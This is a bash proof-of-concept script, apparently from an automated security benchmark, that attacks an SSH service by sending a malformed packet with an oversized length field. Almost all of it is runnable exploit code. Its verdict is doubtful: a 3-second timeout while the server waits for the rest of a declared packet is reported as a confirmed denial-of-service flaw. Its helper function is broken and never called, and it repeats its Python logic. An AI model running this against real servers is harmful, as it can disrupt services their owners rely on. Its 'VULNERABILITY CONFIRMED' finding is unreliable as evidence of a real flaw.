#!/bin/bash
# POC: SSH Denial of Service via Oversized Packet Length Field - Sends malformed SSH packet with 0x00010000 (64KB) length field to trigger service hang
# Target: ./repo
# Created: 2025-11-07T22:08:15.788Z
# Session: benchmark-XBEN-083-24-mhpe40z0

# SSH Protocol DoS via Oversized Packet Length Field
# Targets SSH service on port 22220
# Demonstrates that sending a packet with length field set to 0x00010000 (64KB)
# causes the service to hang indefinitely

TARGET_HOST="${1:-localhost}"
TARGET_PORT="${2:-22220}"
TIMEOUT="${3:-3}"

echo "[*] SSH DoS - Oversized Packet Length Field Test"
echo "[*] Target: $TARGET_HOST:$TARGET_PORT"
echo "[*] Timeout: ${TIMEOUT}s"
echo ""

# Create a temporary file for the exploit data
TMPFILE=$(mktemp)
trap "rm -f $TMPFILE" EXIT

# Function to send the exploit
send_exploit() {
    local timeout_val=$1
    
    # Python script to send the malformed SSH packet
    python3 << 'EOF'
import socket
import struct
import sys
import time

target_host = sys.argv[1]
target_port = int(sys.argv[2])
timeout_val = int(sys.argv[3])

try:
    print("[+] Connecting to SSH service...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout_val)
    sock.connect((target_host, target_port))
    print("[+] Connected!")
    
    # Receive SSH banner
    print("[+] Receiving server banner...")
    banner = sock.recv(1024)
    print(f"[+] Server banner: {banner.decode().strip()}")
    
    # Send SSH client identification string
    client_id = b'SSH-2.0-OpenSSH_7.4\r\n'
    print("[+] Sending SSH client identification string...")
    sock.sendall(client_id)
    print(f"[+] Sent: {client_id.decode().strip()}")
    
    # Receive key exchange init
    print("[+] Receiving key exchange init...")
    kex = sock.recv(4096)
    print(f"[+] Received {len(kex)} bytes of key exchange data")
    
    # Send malformed SSH packet with oversized length field (0x00010000 = 64KB)
    print("[+] Sending malformed SSH packet with length field: 0x00010000 (64KB)...")
    
    # SSH packet structure: packet_length (4 bytes) + padding_length (1 byte) + payload + random_padding
    # We send only the length field and minimal data to trigger the hang
    oversized_length = 0x00010000  # 64KB
    
    # Send packet with length field set to 64KB
    packet_data = struct.pack('>I', oversized_length)
    packet_data += b'\x00' * 100  # Send 100 bytes of padding/data
    
    sock.sendall(packet_data)
    print(f"[+] Sent {len(packet_data)} bytes (length field: 0x{oversized_length:08x})")
    
    # Try to receive response - should timeout/hang
    print(f"[+] Waiting for response with {timeout_val}s timeout...")
    start_time = time.time()
    
    try:
        response = sock.recv(1024)
        elapsed = time.time() - start_time
        if response:
            print(f"[+] Received response after {elapsed:.2f}s: {len(response)} bytes")
            print("[!] Service responded - vulnerability may not be present")
            return False
        else:
            print("[+] Connection closed by server")
            return False
    except socket.timeout:
        elapsed = time.time() - start_time
        print(f"[!] TIMEOUT after {elapsed:.2f}s - Service hung waiting for data")
        print("[+] VULNERABILITY CONFIRMED: Service hangs on oversized packet length field")
        return True
    
except socket.error as e:
    print(f"[-] Socket error: {e}")
    return False
except Exception as e:
    print(f"[-] Error: {e}")
    return False
finally:
    try:
        sock.close()
    except:
        pass

EOF
}

# Execute the exploit
python3 -c "
import socket
import struct
import sys
import time

target_host = '$TARGET_HOST'
target_port = $TARGET_PORT
timeout_val = $TIMEOUT

try:
    print('[+] Connecting to SSH service at $TARGET_HOST:$TARGET_PORT...')
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout_val)
    sock.connect((target_host, target_port))
    print('[+] Connected!')
    
    # Receive SSH banner
    print('[+] Receiving server banner...')
    banner = sock.recv(1024)
    print(f'[+] Server banner: {banner.decode().strip()}')
    
    # Send SSH client identification string
    client_id = b'SSH-2.0-OpenSSH_7.4\r\n'
    print('[+] Sending SSH client identification string...')
    sock.sendall(client_id)
    
    # Receive key exchange init
    print('[+] Receiving key exchange init...')
    kex = sock.recv(4096)
    print(f'[+] Received {len(kex)} bytes of key exchange data')
    
    # Send malformed SSH packet with oversized length field (0x00010000 = 64KB)
    print('[+] Sending malformed SSH packet with oversized length field: 0x00010000 (64KB)...')
    
    oversized_length = 0x00010000
    packet_data = struct.pack('>I', oversized_length)
    packet_data += b'\x00' * 100
    
    sock.sendall(packet_data)
    print(f'[+] Sent packet with length field: 0x{oversized_length:08x}')
    
    print(f'[+] Waiting for response with {timeout_val}s timeout...')
    start_time = time.time()
    
    try:
        response = sock.recv(1024)
        elapsed = time.time() - start_time
        if response:
            print(f'[!] Service responded after {elapsed:.2f}s')
            sys.exit(1)
        else:
            print(f'[+] Connection closed by server after {elapsed:.2f}s')
            sys.exit(1)
    except socket.timeout:
        elapsed = time.time() - start_time
        print(f'[!] TIMEOUT after {elapsed:.2f}s - Service hung waiting for full packet')
        print('[+] VULNERABILITY CONFIRMED: SSH service hangs on oversized packet length')
        sys.exit(0)

except Exception as e:
    print(f'[-] Error: {e}')
    sys.exit(1)
finally:
    try:
        sock.close()
    except:
        pass
"

exit_code=$?
echo ""
if [ $exit_code -eq 0 ]; then
    echo "[+] POC Completed - Vulnerability demonstrated"
    exit 0
else
    echo "[-] POC did not confirm vulnerability"
    exit 1
fi